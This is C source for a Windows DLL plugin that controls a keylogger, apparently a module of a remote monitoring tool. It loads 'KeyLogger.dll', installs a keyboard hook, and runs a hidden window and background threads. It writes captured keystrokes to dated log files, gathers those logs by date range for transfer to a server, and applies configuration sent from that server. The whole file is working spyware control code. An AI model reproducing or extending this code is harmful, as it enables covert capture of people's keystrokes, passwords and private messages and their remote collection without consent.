//** Running in the Main Thread.

#include "..\..\..\Include\Keylog.h"

INSTALLPROC			InstallKLHookProc;
REMOVEPROC			RemoveKLHookProc;

CRITICAL_SECTION	csSleepTimer;				// Critical Section Object used to synchronize fSleepTimerVal..
CRITICAL_SECTION	csKLTree;					// Critical Section Object used to synchronize Tree nodes..

BOOL		fWindowCreated;						// Is the Window Created?
BOOL		fRealTime;							//	RealTime Mode / Offline Mode
BOOL		fInit;								// Initialization done ?
BOOL		fExitKLLogFileUpdate;				// Terminate LogFile Update Thread..

DWORD		dwSleepTimerVal;					// Offline Time Interval / RealTime Time Interval >> in milliseconds..

HINSTANCE	hInstance;
HMODULE		hKLDll;

HANDLE		hConfigChangeEvent;					// Indication to hook DL about the change in KLConfig File
HANDLE		hUpdateLogFileEvent;				// Write to log file Event Handle

HANDLE		hUpdateLogFileThread;				// Writing to the LogFile
LPDWORD		lpUpdateLogFileThreadID;

HANDLE		hSleepTimerThread;					// Sleeping Thread.. Used as a Timer..
LPDWORD		lpSleepTimerThreadID;

WCHAR		g_wszCWD[MAX_PATH + 1];				// Current Working Directory..
WCHAR       wszConfigPath[MAX_PATH + 1];		// KLConfig File Path..
WCHAR		LogFilePath[MAX_PATH + 1];			// Log File Path..

PDATA		*pMyPData = NULL;					// Pointer to the PDATA structure which must be sent to the CPM
                                                // for further transfer to the server machine.

BOOL WINAPI DllMain(HINSTANCE hDllHandle, DWORD nReason, LPVOID Reserved) {
    switch (nReason) {

        case DLL_PROCESS_ATTACH:
            break;

        case DLL_THREAD_ATTACH:
            break;

        case DLL_THREAD_DETACH:
            break;

        case DLL_PROCESS_DETACH:
            fExitKLLogFileUpdate = TRUE;
            break;
    }

    hInstance = (HINSTANCE)hDllHandle;
    return TRUE;
}

BOOL ProcessCmd(RM_COMMAND Cmd, MNTRDATA *MNTRData, PDATA __out **pPDataToCPM) {
    int		iRetVal = -1;
    FILE	*fpConfig = NULL;
    errno_t iError;
    BOOL	fEvent = FALSE;
    BOOL	FuncRetVal = FALSE;

    LPDWORD lpCreateHiddenWindowThreadID = NULL;
    HANDLE hCreateHiddenWindowThread = NULL;


    WCHAR	*pwszCWD = NULL;
    WCHAR	LogFileName[MAX_FILE_NAME + 1];

    if (hKLDll == NULL) {
        hKLDll = LoadLibrary(L"KeyLogger.dll");
        if (hKLDll == NULL)
            return FALSE;

        InstallKLHookProc = (INSTALLPROC)GetProcAddress(hKLDll, "InstallKLHook");
        iRetVal = GetLastError();

        RemoveKLHookProc = (REMOVEPROC)GetProcAddress(hKLDll, "RemoveKLHook");
        iRetVal = GetLastError();

        if (InstallKLHookProc == NULL || RemoveKLHookProc == NULL) {
            FreeLibrary(hKLDll);
            hKLDll = NULL;
            return FALSE;
        }

        hCreateHiddenWindowThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)CreateHiddenWindow, (LPVOID)hInstance, 0, lpCreateHiddenWindowThreadID);
        if (hCreateHiddenWindowThread == NULL) {
            fWindowCreated = FALSE;
            return FALSE;
        }
    }
    // End of if( hKLDll == NULL )

    switch (Cmd)				// RM_COMMAND from CPM
    {
        case IF_INIT_PLUGIN:
        {
            // get current working directory and store in global variable
            if ((pwszCWD = _wgetcwd(NULL, 0)) == NULL) {
                return FALSE;
            }
            wcscpy_s(g_wszCWD, MAX_PATH, pwszCWD);

            // free the memory >>>> _wgetcwd() automatically allocates using malloc..
            if (pwszCWD)
                free(pwszCWD);

            SYSTEMTIME SysTime;
            GetLocalTime(&SysTime);
            wsprintf(LogFileName, L"%d-%d-%d.log", SysTime.wDay, SysTime.wMonth, SysTime.wYear);
            wsprintf(LogFilePath, L"%s\\%s", FP_LOGFILES_DIR, LogFileName);

            CreateDirectory(FP_KL_DIR, NULL);
            CreateDirectory(FP_LOGFILES_DIR, NULL);

            hConfigChangeEvent = CreateEvent(NULL, TRUE, FALSE, L"Global\\KLConfigUpdate");	// 2nd param - Use ResetEvent to set the event state to nonsignaled..
            if (hConfigChangeEvent == NULL)
                return FALSE;

            if (fInit == FALSE) {
                fInit = TRUE;
                InitializeCriticalSection(&csKLTree);
                InitializeCriticalSection(&csSleepTimer);

                // Set Default Time Interval
                SetSleepTimerVal(KLIF_RT_STOP);

                hUpdateLogFileThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)UpdateLogFile, NULL, 0, lpUpdateLogFileThreadID);
                if (hUpdateLogFileThread == NULL) {
                    fInit = FALSE;
                    return FALSE;
                }
                hUpdateLogFileEvent = CreateEvent(NULL, TRUE, FALSE, L"UpdateLogFile");
                if (hUpdateLogFileEvent == NULL) {
                    fInit = FALSE;
                    return FALSE;
                }

                hSleepTimerThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)SleepTimer, NULL, 0, lpSleepTimerThreadID);
                if (hSleepTimerThread == NULL) {
                    fInit = FALSE;
                    return FALSE;
                }
            }

            // Call KeyLogger Hook
            if (InstallKLHookProc(g_wszCWD) == FALSE) {
                return FALSE;
            }

            break;
        }

        case IF_TERM_PLUGIN:
        {
            RemoveKLHookProc();

            if (hConfigChangeEvent)
                CloseHandle(hConfigChangeEvent);

            if (hKLDll)
                FreeLibrary(hKLDll);
            hKLDll = NULL;

            HWND hKLIFWnd = FindWindowEx(HWND_MESSAGE, NULL, KLIF_WND_CLASS_NAME, KLIF_WND_TITLE);
            if (hKLIFWnd)
                SendMessage(hKLIFWnd, WM_DESTROY, 0, 0l);

            if (hUpdateLogFileEvent)
                SetEvent(hUpdateLogFileEvent);

            // to exit the thread (thread checks this value upon next iteration)
            fExitKLLogFileUpdate = TRUE;
            if (hUpdateLogFileEvent)
                SetEvent(hUpdateLogFileEvent);

            if (hUpdateLogFileThread != NULL)
                WaitForSingleObject(hUpdateLogFileThread, INFINITE);

            DeleteCriticalSection(&csKLTree);
            DeleteCriticalSection(&csSleepTimer);
            break;
        }

        case IF_CMD_PLUGIN:
        {
            switch (MNTRData->KLMData.cmd) {
                case KLIF_GET_LOGFILES:
                {
                    int i;
                    HANDLE hIFDataReadyEvent = NULL;
                    WCHAR wszLogFilesPath[MAX_PATH + 1];

                    FILE_TRANSFER_DATA LogFilesList;

                    // Construct the absolute path of the LogFiles directory
                    wsprintf(wszLogFilesPath, L"%s\\%s", g_wszCWD, FP_LOGFILES_DIR);

                    // search the directory for the required files 
                    // (within FromDate and ToDate, inclusive).
                    if (RetrieveLogFiles(wszLogFilesPath, &MNTRData->KLMData.stFromDate,
                        &MNTRData->KLMData.stToDate, &LogFilesList) == FALSE) {
                        // error
                        return FALSE;
                    } else {
                        // send the LogFilesList to server
                        for (i = 0; i < LogFilesList.nFiles; ++i)
                            OutputDebugString(LogFilesList.ListOfFiles[i].wszFileName);

                        // allocate memory for PDATA
                        if ((pMyPData = (PDATA*)malloc(sizeof(PDATA))) == NULL)
                            return FALSE;

                        // construct the PDATA structure and send it
                        pMyPData->iMessage = KLM_LOGFILES;
                        pMyPData->PluginID = KEYLOGGER;
                        memcpy(&pMyPData->PDataType.KLFileTransfer, &LogFilesList, sizeof(FILE_TRANSFER_DATA));

                        // first, obtain handle to the event
                        hIFDataReadyEvent = CreateEvent(NULL, TRUE, FALSE, EVENT_IF_DATA_READY);
                        if (hIFDataReadyEvent == NULL) {
                            iRetVal = GetLastError();
                            return FALSE;
                        } else if (GetLastError() == ERROR_ALREADY_EXISTS) {
                            SetEvent(hIFDataReadyEvent);
                        }
                    }
                    return TRUE;
                }

                case KLIF_RT_START:
                {
                    SetSleepTimerVal(KLIF_RT_START);
                    break;
                }

                case KLIF_RT_STOP:
                {
                    SetSleepTimerVal(KLIF_RT_STOP);
                    break;
                }

                case KLIF_UPDATE_CONFIG:		// change in Config made at Server side UI
                {
                    SetSleepTimerVal(KLIF_RT_STOP);

                    wsprintf(wszConfigPath, L"%s\\%s\\KLConfig.conf", g_wszCWD, FP_KL_DIR);

                    iError = _wfopen_s(&fpConfig, wszConfigPath, L"wb");

                    if (iError != 0)
                        return FALSE;

                    iError = fwrite(&MNTRData->KLMData.KLConfig, sizeof(KLCONFIG), 1, fpConfig);
                    if (iError < 1)
                        return FALSE;

                    if (fpConfig != NULL)
                        fclose(fpConfig);

                    iRetVal = SetEvent(hConfigChangeEvent);
                    if (iRetVal == 0)
                        return FALSE;

                    break;
                }
            }
            break;
        }

        case IF_GET_PDATA:
        {
            // copy the previously generated PDATA to the __out parameter pPData
            if (pMyPData) {
                *pPDataToCPM = pMyPData;
                pMyPData = NULL;
            } else
                *pPDataToCPM = NULL;

            break;
        }
    }// End of switch( Cmd )
    return TRUE;
}


// RetrieveLogFiles()
// Function to traverse the specified directory and return the filepaths 
// of those log files which fall under specified values to FromDate and ToDate.
BOOL RetrieveLogFiles(const WCHAR *wszDirPath, const SYSTEMTIME *stFromDate, const SYSTEMTIME *stToDate,
    FILE_TRANSFER_DATA *pLogFilesList) {

    int nFiles;
    WCHAR wszFilePath[MAX_PATH + 1];
    HANDLE hFirstFile;
    WIN32_FIND_DATA FileData;
    int iRetVal;
    WORD wFromDate, wFromMonth, wFromYear;
    WORD wToDate, wToMonth, wToYear;
    WORD wDate, wMonth, wYear;

    // initialize
    wDate = wFromDate = stFromDate->wDay;
    wMonth = wFromMonth = stFromDate->wMonth;
    wYear = wFromYear = stFromDate->wYear;

    wToDate = stToDate->wDay;
    wToMonth = stToDate->wMonth;
    wToYear = stToDate->wYear;

    pLogFilesList->nFiles = nFiles = 0;

    while (TRUE) {
        // construct the search path
        wsprintf(wszFilePath, L"%s\\%d-%d-%d.log", wszDirPath, wDate, wMonth, wYear);
        iRetVal = lstrlen(wszFilePath);

        if ((hFirstFile = FindFirstFile(wszFilePath, &FileData)) != INVALID_HANDLE_VALUE) {
            // file found, copy file name to FILE_TRANSFER_DATA structure
            wsprintf(pLogFilesList->ListOfFiles[nFiles].wszFileName, L"%s\\%s", wszDirPath, FileData.cFileName);
            ++nFiles;
            (pLogFilesList->nFiles)++;

        }

        GetNextDate(&wDate, &wMonth, &wYear);

        // validate the incremented date
        if (wYear > stToDate->wYear)
            break;
        else if (wYear == stToDate->wYear) {
            // wMonth must be less than ToMonth
            if (wMonth > stToDate->wMonth)
                break;
            else if (wMonth == stToDate->wMonth) {
                // wDate must be <= ToDate
                if (wDate > stToDate->wDay)
                    break;
            }
        }

        // if computed date falls within the specified range, loop continues

    }// while(TRUE)
    return TRUE;

}// RetrieveLogFiles()

// GetNextDate()
// --
BOOL GetNextDate(WORD *pDate, WORD *pMonth, WORD *pYear) {

    WORD wDate, wMonth, wYear;

    int iMaxMonthDays[] = { 31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31 };
    int iLeapMaxMonthDays[] = { 31, 29, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31 };

    wDate = *pDate;
    wMonth = *pMonth;
    wYear = *pYear;

    wDate++;

    // check leap year
    if ((wYear % 400 == 0) || ((wYear % 4 == 0) && (wYear % 100 != 0))) {
        if (wDate > iLeapMaxMonthDays[wMonth - 1])		// overflow
        {
            wDate = 1;
            wMonth++;
            if (wMonth > 12) {
                wMonth = 1;
                wYear++;
            }
        }
    } else {
        if (wDate > iMaxMonthDays[wMonth - 1])		// overflow
        {
            wDate = 1;
            wMonth++;
            if (wMonth > 12) {
                wMonth = 1;
                wYear++;
            }
        }
    }

    // set the _in_out arguments
    *pDate = wDate;
    *pMonth = wMonth;
    *pYear = wYear;

    return TRUE;

}// GetNextDate()

BOOL SetSleepTimerVal(RM_COMMAND Cmd) {
    FILE	*fpConfig = NULL;
    errno_t iError;
    KLCONFIG KLConfig;
    WCHAR wszConfigFilePath[MAX_PATH + 1];

    wsprintf(wszConfigFilePath, L"%s\\%s\\KLConfig.conf", g_wszCWD, FP_KL_DIR);
    // open config file..
    iError = _wfopen_s(&fpConfig, wszConfigFilePath, L"rb");
    if (iError != 0) {
        OutputDebugString(L"Config file not found");
        return FALSE;
    }

    fread(&KLConfig, sizeof(KLCONFIG), 1, fpConfig);

    if (fpConfig != NULL)
        fclose(fpConfig);

    EnterCriticalSection(&csSleepTimer);

    if (Cmd == KLIF_RT_START) {
        dwSleepTimerVal = KLConfig.ulRTInterval;
        fRealTime = TRUE;
    } else if (KLIF_RT_STOP) {
        dwSleepTimerVal = KLConfig.ulOffInterval;
        fRealTime = FALSE;
    }

    LeaveCriticalSection(&csSleepTimer);

    return TRUE;
}
